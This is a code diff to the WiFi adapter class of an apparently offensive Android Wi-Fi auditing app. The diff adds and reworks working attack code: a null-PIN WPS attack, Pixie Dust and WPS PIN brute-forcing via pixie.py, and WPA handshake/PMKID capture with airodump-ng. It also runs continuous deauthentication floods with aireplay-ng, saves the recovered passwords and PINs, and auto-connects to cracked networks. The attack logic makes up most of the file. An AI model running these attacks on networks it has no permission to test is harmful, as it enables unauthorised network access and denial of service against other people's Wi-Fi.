@@ -12,6 +12,7 @@ import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.res.ColorStateList;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.os.Build;
@@ -42,6 +43,7 @@ import com.zalexdev.stryker.custom.WiFINetwork;
 import com.zalexdev.stryker.utils.AdvancedProcess;
 import com.zalexdev.stryker.utils.AdvancedThread;
 import com.zalexdev.stryker.utils.Core;
+import com.zalexdev.stryker.utils.MonitorManager;
 import com.zalexdev.stryker.utils.SimpleProcess;
 import com.zalexdev.stryker.utils.Utils;
 
@@ -68,16 +70,36 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
     public int tag = 0;
     public Timer deauth;
     public Core core;
-    public AdvancedProcess pixie = null;
-    public AdvancedProcess oneshot = null;
-    public AdvancedProcess deauther = null;
-    public AdvancedProcess brutepin = null;
-    public AdvancedThread handshake = null;
-    public AdvancedThread brutepsk = null;
-    public AdvancedProcess airodump = null;
+    public volatile AdvancedProcess pixie = null;
+    public volatile AdvancedProcess oneshot = null;
+    public volatile AdvancedProcess deauther = null;
+    public volatile AdvancedProcess brutepin = null;
+    public volatile AdvancedThread handshake = null;
+    public volatile AdvancedThread brutepsk = null;
+    public volatile AdvancedProcess airodump = null;
     public Timer aireplay;
     public String pinconnect;
     public String wordlistpath;
+    private static final Pattern MAC_TOKEN = Pattern.compile("(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}");
+
+    private String archiveCapture(String captureDir, String filename) {
+        java.io.File[] caps = new java.io.File(core.getShareRoot() + "/hs")
+                .listFiles((d, n) -> n.startsWith("handshake-") && n.endsWith(".cap"));
+        java.io.File newest = null;
+        if (caps != null) {
+            for (java.io.File f : caps) {
+                if (newest == null || f.lastModified() > newest.lastModified()) newest = f;
+            }
+        }
+        if (newest == null) return null;
+        //noinspection ResultOfMethodCallIgnored
+        new java.io.File(captureDir).mkdirs();
+        String safe = filename.replaceAll("[^A-Za-z0-9._-]", "_");
+        if (safe.length() > 120) safe = safe.substring(safe.length() - 120);
+        String dest = captureDir + "/" + safe;
+        core.moveFile(newest.getAbsolutePath(), dest);
+        return new java.io.File(dest).isFile() ? dest : null;
+    }
 
 
     public WiFIAdapter(Context context2, Activity mActivity, ArrayList<WiFINetwork> wifi) {
@@ -141,7 +163,15 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 : vendor);
         if (wifi.getModel() != null && wifi.getModel().length() > 0) {
             adapter.wifi_model.setText(context.getString(R.string.wifi_card_model, wifi.getModel()));
-            if (wifi.isVulnerable()) {
+            if (wifi.isVulnVerified()) {
+                adapter.pixie_mark.setText(R.string.wifi_chip_pixie_verified);
+                adapter.pixie_mark.setBackgroundTintList(ColorStateList.valueOf(0xFFE65100));
+                adapter.pixie_mark.setTextColor(0xFFFFFFFF);
+                adapter.pixie_mark.setVisibility(View.VISIBLE);
+            } else if (wifi.isVulnerable()) {
+                adapter.pixie_mark.setText(R.string.wifi_chip_pixie);
+                adapter.pixie_mark.setBackgroundTintList(ColorStateList.valueOf(0xFFFFE0B2));
+                adapter.pixie_mark.setTextColor(0xFFE65100);
                 adapter.pixie_mark.setVisibility(View.VISIBLE);
             }
         }
@@ -207,6 +237,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         MaterialCardView deauther = dialog.findViewById(R.id.deauth);
         MaterialCardView try_handshake = dialog.findViewById(R.id.handshake_capture);
         MaterialCardView custom_pin = dialog.findViewById(R.id.custom_pin);
+        MaterialCardView null_pin = dialog.findViewById(R.id.null_pin);
         MaterialCardView brute_psk = dialog.findViewById(R.id.pass_bruteforce);
         MaterialCardView brute_pincode = dialog.findViewById(R.id.pin_bruteforce);
         MaterialCardView common_pins = dialog.findViewById(R.id.common_pins);
@@ -305,6 +336,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         custom_pin.setOnClickListener(view -> {
             attackDialog(network,5);
         });
+        null_pin.setOnClickListener(view -> {
+            attackDialog(network,8);
+        });
         common_pins.setOnClickListener(view -> {
 
             attackDialog(network,6);
@@ -356,7 +390,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             model.setVisibility(View.GONE);
         }
         final boolean[] finished = {false};
+        final AtomicBoolean dialogCanceled = new AtomicBoolean(false);
         cancel.setOnClickListener(view -> {
+            dialogCanceled.set(true);
             dialog.dismiss();
             if (pixie != null) {pixie.kill();}
             if (handshake != null) {handshake.setCanceled(true);}
@@ -372,11 +408,16 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
             }
             new Thread(() -> {
-                if (core.monitorManager.isMonitorModeEnabled(core.getHSInterface())) {
+                String hsIface = core.getHSInterface();
+                String deauthIface = core.getDeauthInterface();
+                boolean hsMon = core.monitorManager.isMonitorModeEnabled(hsIface);
+                boolean deauthMon = !deauthIface.equals(hsIface)
+                        && core.monitorManager.isMonitorModeEnabled(deauthIface);
+                if (hsMon || deauthMon) {
                     core.toaster(activity, "Disabling monitor mode...");
-                    core.monitorManager.disableMonitorMode(core.getHSInterface());
-                    core.monitorManager.disableMonitorMode(core.getDeauthInterface());
                 }
+                if (hsMon) core.monitorManager.disableMonitorMode(hsIface);
+                if (deauthMon) core.monitorManager.disableMonitorMode(deauthIface);
                 restoreWpsInterface();
         }).start();
 
@@ -387,9 +428,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         dialog.show();
         if (type == 1){
             final int[] scanCount = {0};
-            core.wpsDisableWifiIfEnabled();
             String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
-                    + " --pixie-force" + core.wpsIfaceDownFlag() + " -K -F -b " + network.getMac();
+                    + core.wpsIfaceDownFlag() + " -K -F -b " + network.getMac();
+            new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
             pixie = new AdvancedProcess(activity, context, cmd, true) {
                 @Override
                 public void onFinished(ArrayList<String> outputList) {
@@ -418,15 +459,15 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             core.connectWiFi2(network.getSsid(),result.getPsk());
                             core.connectWiFi2(network.getSsid(),result.getPsk());
                             new Thread(() -> {
-                                long end = System.currentTimeMillis() + 10000;
-                                String iface = core.getWPSInterface();
+                                long end = System.currentTimeMillis() + 20000;
                                 while (System.currentTimeMillis() < end) {
+                                    if (checkIsSsidConnected(network.getSsid())) {
+                                        activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
+                                        return;
+                                    }
                                     try {
-                                        String connectedNetwork = core.customChrootCommand("iw dev " + iface + " link | awk '/SSID/ {print $NF}'").get(0);
-                                        if (connectedNetwork.equals(network.getSsid())) {
-                                            activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
-                                        }
-                                    } catch (Exception ignored) {
+                                        Thread.sleep(1000);
+                                    } catch (InterruptedException e) {
                                         return;
                                     }
                                 }
@@ -445,13 +486,13 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 public void onNewLine(String line) {
 
                     if (line.contains("WPA PSK:")){
-                        process.destroy();
+                        kill();
                     }
                     if (line.contains("Associating with AP…")){
                         scanCount[0]++;
                     }
                     if (scanCount[0] > 3){
-                        process.destroy();
+                        kill();
                     }
                     if(core.getBoolean("hide")){
                         Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
@@ -503,15 +544,15 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                             core.connectWiFi2(network.getSsid(),result.getPsk());
                                             core.connectWiFi2(network.getSsid(),result.getPsk());
                                             new Thread(() -> {
-                                                long end = System.currentTimeMillis() + 10000;
-                                                String iface = core.getWPSInterface();
+                                                long end = System.currentTimeMillis() + 20000;
                                                 while (System.currentTimeMillis() < end) {
+                                                    if (checkIsSsidConnected(network.getSsid())) {
+                                                        activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
+                                                        return;
+                                                    }
                                                     try {
-                                                        String connectedNetwork = core.customChrootCommand("iw dev " + iface + " link | awk '/SSID/ {print $NF}'").get(0);
-                                                        if (connectedNetwork.equals(network.getSsid())) {
-                                                            activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
-                                                        }
-                                                    } catch (Exception ignored) {
+                                                        Thread.sleep(1000);
+                                                    } catch (InterruptedException e) {
                                                         return;
                                                     }
                                                 }
@@ -581,8 +622,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         }
         else if (type == 3){
 
-            String wlanscan = core.getHSInterface();
-            String wlandeauth = core.getDeauthInterface();
             Timer deauthtimer = new Timer();
             final boolean[] hsStatus = {false};
             final boolean[] pmkidStatus = {false};
@@ -623,32 +662,37 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     boolean monitor;
                     boolean monitor2 = true;
 
+                    String wlanscan = core.getHSInterface();
+                    String deauthPref = core.getDeauthInterface();
                     ArrayList<String> clients = new ArrayList<>();
-                    if (wlandeauth.contains("wlan0")){deauth = false;}
-                    sendEvent("Enabling monitor mode...");
-                    if (deauth){
-                        monitor = core.monitorManager.enableMonitorMode(wlanscan, String.valueOf(network.getChannel()));
-                        if (!wlanscan.equals(wlandeauth)){
-                            monitor2 = core.monitorManager.enableMonitorMode(wlandeauth,String.valueOf(network.getChannel()));
+                    if (!core.isRootless() && MonitorManager.isInternalRadio(deauthPref)){
+                        if (!MonitorManager.isInternalRadio(wlanscan)) {
+                            deauthPref = wlanscan;
+                            sendEvent("Deauth interface is the internal radio — using " + wlanscan + " instead");
+                        } else {
+                            deauth = false;
                         }
-                    }else{
-                        monitor = core.monitorManager.enableMonitorMode(wlandeauth);
+                    }
+                    final String wlandeauth = deauthPref;
+                    sendEvent("Enabling monitor mode...");
+                    monitor = core.monitorManager.enableMonitorMode(wlanscan, String.valueOf(network.getChannel()));
+                    if (deauth && !wlanscan.equals(wlandeauth)){
+                        monitor2 = core.monitorManager.enableMonitorMode(wlandeauth,String.valueOf(network.getChannel()));
                     }
 
                     final boolean[] airoRunning = {false};
 
                     if (monitor && monitor2){
                         sendEvent("Starting airodump-ng...");
-                        core.deleteFile(core.getStorage()+"Stryker/hs/handshake-01.cap");
-                        if (core.getHSInterface().contains("wlan0")){
-                            new Thread(() -> {
-                                core.customChrootCommand("iw dev "+core.getHSInterface()+" set channel "+network.getChannel());
-                            }).start();
-                        }
+                        core.customChrootCommand("mkdir -p /sdcard/Stryker/hs /sdcard/Stryker/captured; "
+                                + "rm -f /sdcard/Stryker/hs/handshake*");
+                        final String capIface = core.getHSInterface();
+                        if (canceled) return;
                         new Thread(() -> {
-                            String cmd = "airodump-ng " + core.getHSInterface() + " -w /sdcard/Stryker/hs/handshake  --ignore-negative-one --output-format pcap -c "+network.getChannel()+" --bssid " + network.getMac()+" --update 3";
-                            if (network.getIs5hhz()){
-                                cmd = "airodump-ng " + core.getHSInterface() + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one --output-format pcap  --bssid " + network.getMac() + " --band a --update 3";
+                            if (canceled) return;
+                            String cmd = "airodump-ng " + capIface + " -w /sdcard/Stryker/hs/handshake  --ignore-negative-one --output-format pcap -c "+network.getChannel()+" --bssid " + network.getMac()+" --update 3";
+                            if (network.getIs5hhz() && network.getChannel() <= 0){
+                                cmd = "airodump-ng " + capIface + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one --output-format pcap  --bssid " + network.getMac() + " --band a --update 3";
                             }
 
 
@@ -662,7 +706,8 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                                 @Override
                                 public void onNewLine(String line) {
-                                    if (line != null){
+                                    try {
+                                        if (line == null) return;
                                         if (line.contains(network.getMac().toUpperCase()) || line.contains(network.getMac()) || line.contains(network.getMac().toLowerCase()) || line.contains(" WPA")){
                                             airoRunning[0] = true;
                                         }
@@ -675,11 +720,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                                         line = line.replace(network.getMac().toUpperCase(),"");
                                         line = line.trim().replaceAll("\\s+"," ");
-                                        String mac = line.split(" ")[1];
-                                        if (mac.contains(":") && !clients.contains(mac)){
-                                            clients.add(mac);
-                                            sendEvent("New client found : "+mac);
-                                        }
                                         if (line.contains("WPA handshake:")){
                                             sendEvent("Handshake captured! Bingo!");
                                             hsStatus[0] = true;
@@ -688,7 +728,18 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                             sendEvent("PMKID captured! Bingo!");
                                             pmkidStatus[0] = true;
                                         }
-                                    }}
+                                        for (String token : line.split(" ")){
+                                            if (token.length() == 17 && token.indexOf(':') == 2
+                                                    && MAC_TOKEN.matcher(token).matches()
+                                                    && !clients.contains(token)){
+                                                clients.add(token);
+                                                sendEvent("New client found : "+token);
+                                                break;
+                                            }
+                                        }
+                                    } catch (Exception ignored) {
+                                    }
+                                }
 
                                 @Override
                                 public void onEvent(String line) {
@@ -696,22 +747,37 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                 }
                             };
                             airodump.setNoLog(true);
+                            if (canceled) airodump.kill();
                         }).start();
                         sendEvent("We are waiting for network to appear...");
-                        while (!airoRunning[0]){
+                        long appearDeadline = System.currentTimeMillis() + 60000;
+                        while (!airoRunning[0] && !canceled && System.currentTimeMillis() < appearDeadline){
                             try {
                                 Thread.sleep(1000);
                             } catch (InterruptedException e) {
-                                e.printStackTrace();
+                                break;
                             }
+                        }
+                        if (canceled) return;
+                        if (!airoRunning[0]){
+                            sendEvent("Target never showed up on this channel — aborting.");
+                            if (airodump != null) airodump.kill();
+                            setCanceled(true);
+                            return;
                         }
                             sendEvent("Airodump-ng launched!");
                             if (!deauth){
                                 sendEvent("Can`t deauth with (s)wlan0 interface! Passive mode!");
                             }else{
                             sendEvent("Starting deauth...");}
+                            final String deauthIface = core.monitorManager.isMonitorModeEnabled(wlandeauth + "mon")
+                                    ? wlandeauth + "mon" : wlandeauth;
+                            final String hsIface = capIface;
+                            final boolean internalDeauth = !core.isRootless()
+                                    && MonitorManager.isInternalRadio(deauthIface);
+                            final String[] lastRelock = {""};
                             if (deauth) {
-                                deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + core.getDeauthInterface(), true) {
+                                deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + deauthIface, true) {
                                     @Override
                                     public void onFinished(ArrayList<String> outputList) {
 
@@ -723,12 +789,14 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                         if (line.contains("available") || line.contains("but")) {
                                            deauthNow[0] =  "Deauth failed! Passive mode now! Error: \n"+line;
                                            if (line.contains("but")){
-                                               String ch = line.split(" ")[line.split(" ").length-1];
-                                               core.customChrootCommand("iw dev "+core.getHSInterface()+" set channel "+ch);
-
-
+                                               String[] parts = line.trim().split("\\s+");
+                                               String ch = parts[parts.length - 1];
+                                               if (ch.matches("\\d{1,3}") && !ch.equals(lastRelock[0])) {
+                                                   lastRelock[0] = ch;
+                                                   core.threadChrootCommand("iw dev " + hsIface + " set channel " + ch);
+                                               }
                                            }
-                                            if (core.getDeauthInterface().contains("wlan0")) {
+                                            if (internalDeauth) {
                                                 deauthNow[0] = "Can`t deauth with (s)wlan0 interface! Passive mode!";
                                             }
                                             smoothScrool(outputtext);
@@ -742,7 +810,11 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                     }
                                 };
                             }
-                            while (!hsStatus[0] && !pmkidStatus[0]){
+                            while (!hsStatus[0] && !pmkidStatus[0] && !canceled){
+                                    if (airodump != null && !airodump.isRunning()){
+                                        sendEvent("airodump-ng stopped unexpectedly — aborting.");
+                                        break;
+                                    }
                                     StringBuilder cls = new StringBuilder();
                                     for (String client : clients){
                                         cls.append(client).append(" ");
@@ -766,27 +838,21 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             if (airodump != null) {
                             airodump.kill();
                             }
-                            if (hsStatus[0]) {
-                                sendEvent("Handshake captured!");
-                                StringBuilder filename = new StringBuilder();
-                                String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
-                                filename.append("HS_").append(network.getSsid().replace(" ", "_")).append(time).append(".cap");
-                                core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap", core.getStorage() + "Stryker/captured/" + filename);
-                                sendEvent("Handshake saved to /sdcard/Stryker/captured/" + filename);
+                            if (canceled) return;
+                            String captureDir = core.getShareRoot() + "/captured";
+                            String time = new SimpleDateFormat("MM_HH_mm", Locale.ENGLISH).format(new Date());
+                            String label = hsStatus[0] ? "HS_" : "PMKID_";
+                            String filename = label + network.getSsid().replace(" ", "_") + time + ".cap";
+                            sendEvent(hsStatus[0] ? "Handshake captured!" : "PMKID captured!");
+                            String saved = archiveCapture(captureDir, filename);
+                            if (saved == null) {
+                                sendEvent("Capture file not found — nothing was saved.");
+                            } else {
+                                sendEvent((hsStatus[0] ? "Handshake" : "PMKID") + " saved to " + saved);
                                 com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
                                         context, network.getMac(), network.ssid);
-                                activity.runOnUiThread(this::onFinished);
-                            }else{
-                                sendEvent("PMKID captured!");
-                                StringBuilder filename = new StringBuilder();
-                                String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
-                                filename.append("PMKID_").append(network.getSsid().replace(" ", "_")).append(time).append(".cap");
-                                core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap", core.getStorage() + "Stryker/captured/" + filename);
-                                sendEvent("PMKID saved to /sdcard/Stryker/captured/" + filename);
-                                com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
-                                        context, network.getMac(), network.ssid);
-                                activity.runOnUiThread(this::onFinished);
                             }
+                            activity.runOnUiThread(this::onFinished);
 
                     }else {
                         sendEvent("Failed to start monitor mode");
@@ -834,7 +900,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     resulttext.setVisibility(View.VISIBLE);
                     if (back.getOK()){
                         if (core.isStoreEnabled()) {
-                            core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
+                            core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                         }
                         core.scale(wifiimg,1.0F);
                         core.scale(attack_progress,0.0F);
@@ -873,6 +939,64 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 }
             };
         }
+        else if (type == 8){
+            core.scale(wifiimg, 0.65F);
+            core.scale(attack_progress, 1.0F);
+            cancel.setText(android.R.string.cancel);
+            outputtext.setText(context.getResources().getString(R.string.wifi_null_pin_running));
+            outputtext.append("\n");
+            smoothScrool(outputtext);
+            new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
+            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
+                    + core.wpsIfaceDownFlag() + " -N -b " + network.getMac();
+            oneshot = new AdvancedProcess(activity, context, cmd, true) {
+                @Override
+                public void onFinished(ArrayList<String> outputList) {
+                    restoreWpsInterface();
+                    WiFINetwork back = issuccess(outputList);
+                    outputcard.setVisibility(View.GONE);
+                    resulttext.setVisibility(View.VISIBLE);
+                    core.scale(wifiimg, 1.0F);
+                    core.scale(attack_progress, 0.0F);
+                    cancel.setText(android.R.string.ok);
+                    if (back.getOK()) {
+                        if (core.isStoreEnabled()) {
+                            core.saveNetwork(network.getMac(), back.getPsk(), back.getPin(), network.ssid);
+                        }
+                        resulttext.setText(context.getResources().getString(R.string.piin) + back.getPin()
+                                + "\n" + context.getResources().getString(R.string.pass) + back.getPsk());
+                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(), back.getPsk()));
+                        autoconnect.setVisibility(View.VISIBLE);
+                    } else if (Core.contains(outputList, "wps_locked")) {
+                        resulttext.setText(R.string.wifi_wps_locked_result);
+                        autoconnect.setVisibility(View.GONE);
+                    } else if (Core.contains(outputList, "foreign_owner")) {
+                        resulttext.setText(R.string.wifi_foreign_owner_result);
+                        autoconnect.setVisibility(View.GONE);
+                    } else {
+                        resulttext.setText("This router does not accept an empty WPS PIN.");
+                        autoconnect.setVisibility(View.GONE);
+                    }
+                }
+
+                @Override
+                public void onNewLine(String line) {
+                    if (core.getBoolean("hide")) {
+                        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
+                        if (m.find()) {
+                            line = line.replace(m.group(), Core.HIDDEN_MAC);
+                        }
+                    }
+                    outputtext.append(line + "\n");
+                    smoothScrool(outputtext);
+                }
+
+                @Override
+                public void onEvent(String line) {
+
+                }
+            };
+        }
         else if (type == 5){
             final String[] pin = {""};
             core.scale(wifiimg,0.65F);
@@ -903,7 +1027,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                           core.wpsDisableWifiIfEnabled();
                           String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pin[0] +" -b " + network.getMac();
-                          new AdvancedProcess(activity, context, cmd, true) {
+                          oneshot = new AdvancedProcess(activity, context, cmd, true) {
                               @Override
                               public void onFinished(ArrayList<String> outputList) {
                                     restoreWpsInterface();
@@ -915,10 +1039,10 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                     cancel.setText(android.R.string.ok);
                                     if (back.getOK()){
                                         if (core.isStoreEnabled()) {
-                                            core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
+                                            core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                                         }
                                         resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
-                                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
+                                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),back.getPsk()));
                                         autoconnect.setVisibility(View.VISIBLE);
                                     }else{
                                         resulttext.setText("Pin incorrect!");
@@ -962,11 +1086,15 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             cancel.setText(android.R.string.cancel);
             outputtext.setText("Trying to generate common pins...\n");
             ArrayList<String> pins = new ArrayList<>();
-            ArrayList<String> outputList;
             Context app = context;
-            new SimpleProcess(activity,"wpspin "+network.getMac()+" -A",true) {
-                @Override
-                public void onFinished(ArrayList<String> outputList) {
+            String pinGenCmd = "python3 -c \"import sys; sys.path.insert(0,'/CORE/PixieWps'); "
+                    + "from pixie import WPSpin; [print(p) for p in WPSpin().getList(sys.argv[1])]\" "
+                    + network.getMac();
+            new Thread(() -> {
+                final ArrayList<String> outputList = core.customChrootCommand(pinGenCmd);
+                if (dialogCanceled.get()) return;
+                activity.runOnUiThread(() -> {
+                    if (dialogCanceled.get()) return;
                     if (outputList.size() > 0){
                         Pattern p = Pattern.compile("[0-9]{8}");
                         for (String line : outputList){
@@ -975,6 +1103,14 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                 pins.add(m.group());
                             }
                         }
+                    }
+
+                    if (pins.isEmpty()){
+                        outputtext.append("Pin generation failed — no pins produced for this BSSID.\n");
+                        core.scale(wifiimg,1.0F);
+                        core.scale(attack_progress,0.0F);
+                        cancel.setText(android.R.string.ok);
+                        return;
                     }
 
                     final int[] pin_count = {pins.size()};
@@ -994,7 +1130,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                     if (pins.size() > 0){
                                         outputtext.append("Generated "+ pin_count[0] +" pins\n"); AdvancedProcess temp = null;
                                         final WiFINetwork[] result = {null};
-                                        new AdvancedThread(activity, app) {
+                                        brutepsk = new AdvancedThread(activity, app) {
                                             @Override
                                             public void onFinished() {
                                                 restoreWpsInterface();
@@ -1005,7 +1141,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                                 resulttext.setVisibility(View.VISIBLE);
                                                 if (result[0] != null && result[0].getOK()){
                                                     if (core.isStoreEnabled()) {
-                                                        core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
+                                                        core.saveNetwork(network.getMac(),result[0].getPsk(),result[0].getPin(),network.ssid);
                                                     }
                                                     resulttext.setText(context.getResources().getString(R.string.piin)+ result[0].getPin()+"\n"+context.getResources().getString(R.string.pass) + result[0].getPsk());
                                                     autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
@@ -1031,18 +1167,41 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                                 }
                                                 String scaninterface = core.getWPSInterface();
                                                 for (String pin :pins){
+                                                    if (canceled){
+                                                        break;
+                                                    }
                                                     pin_count[0]--;
                                                     sendEvent("Trying pin "+pin+" Left: "+ pin_count[0]);
                                                     String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + scaninterface + core.wpsIfaceDownFlag() + " -p "+pin+" -b " + network.getMac();
-                                                    ArrayList<String> output = core.customChrootCommand(cmd);
-                                                    for (String line : output){
-                                                        sendEvent(line);
-                                                    }
-                                                    result[0] = issuccess(output);
-                                                    if (result[0].getOK()){
-                                                        break;
+                                                    final ArrayList<String> pinOutput = new ArrayList<>();
+                                                    brutepin = new AdvancedProcess(activity, app, cmd, true) {
+                                                        @Override
+                                                        public void onFinished(ArrayList<String> lines) {
+                                                        }
+
+                                                        @Override
+                                                        public void onNewLine(String line) {
+                                                            pinOutput.add(line);
+                                                            sendEvent(line);
+                                                        }
+
+                                                        @Override
+                                                        public void onEvent(String line) {
+                                                        }
+                                                    };
+                                                    while (brutepin.isRunning() && !canceled){
+                                                        try {
+                                                            Thread.sleep(500);
+                                                        } catch (InterruptedException e) {
+                                                            break;
+                                                        }
                                                     }
                                                     if (canceled){
+                                                        brutepin.kill();
+                                                        break;
+                                                    }
+                                                    result[0] = issuccess(pinOutput);
+                                                    if (result[0].getOK()){
                                                         break;
                                                     }
                                                 }
@@ -1066,7 +1225,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                     smoothScrool(outputtext);
 
                                     String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pins.get(i-1) +" -b " + network.getMac();
-                                    new AdvancedProcess(activity, context, cmd, true) {
+                                    oneshot = new AdvancedProcess(activity, context, cmd, true) {
                                         @Override
                                         public void onFinished(ArrayList<String> outputList) {
                                             restoreWpsInterface();
@@ -1078,7 +1237,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                             cancel.setText(android.R.string.ok);
                                             if (back.getOK()){
                                                 if (core.isStoreEnabled()) {
-                                                    core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
+                                                    core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                                                 }
                                                 resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
                                                 autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
@@ -1113,20 +1272,25 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                 }
                             })
                             .show();
-                }
-            };
+                });
+            }).start();
 
 
         }
         else if (type == 7){
+            new Thread(() -> {
+            if (dialogCanceled.get()) return;
+            String deauthIface = core.getDeauthInterface();
             boolean ok = false;
-            if (!core.getDeauthInterface().equals("(s|)wlan0")){
-                ok = core.enableMonitorMode(core.getDeauthInterface(),String.valueOf(network.getChannel()));
+            if (core.isRootless() || !MonitorManager.isInternalRadio(deauthIface)){
+                ok = core.enableMonitorMode(deauthIface, String.valueOf(network.getChannel()));
             }else{
-                outputtext.append("Internal wifi adapter (wlan0) does not support packet injection! Please use external wifi adapter!\n");
+                activity.runOnUiThread(() -> outputtext.append("Internal wifi adapter (wlan0) does not support packet injection! Please use external wifi adapter!\n"));
             }
+            if (dialogCanceled.get()) return;
+            final String monIface = core.getDeauthInterface();
             if (ok) {
-                 deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + core.getDeauthInterface(), true) {
+                 deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + monIface, true) {
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
 
@@ -1152,9 +1316,14 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                     }
                 };
+                if (dialogCanceled.get() && deauther != null) {
+                    deauther.kill();
+                }
             }else{
-                outputtext.append(context.getString(R.string.wifi_monitor_failed, core.getDeauthInterface()) + "\n");
+                activity.runOnUiThread(() ->
+                        outputtext.append(context.getString(R.string.wifi_monitor_failed, monIface) + "\n"));
             }
+            }).start();
         }
     }
 
@@ -1166,6 +1335,17 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
     public void restoreWpsInterface() {
         new Thread(() -> {
+            if (core.isRootless()) {
+                String wpsIface = core.getWPSInterface();
+                if (wpsIface != null && wpsIface.length() > 0) {
